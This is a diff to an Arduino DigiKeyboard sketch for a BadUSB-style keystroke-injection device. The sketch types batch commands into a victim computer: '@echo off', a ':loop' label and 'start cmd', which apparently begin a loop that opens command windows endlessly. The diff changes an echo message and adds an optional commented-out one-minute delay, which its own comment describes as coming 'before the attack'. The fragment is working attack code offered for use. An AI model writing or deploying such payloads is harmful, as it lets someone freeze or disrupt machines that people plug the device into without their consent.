@@ -14,8 +14,10 @@ void setup() {
 
   DigiKeyboard.print("@echo off");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("echo Opening Command Prompt...");
+  DigiKeyboard.print("echo Starting in...");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.print("timeout /t 60 /nobreak");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);      /// ------------------------- uncomment this 2 line to add 1 min delay before the attack 
   DigiKeyboard.print(":loop");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("start cmd");
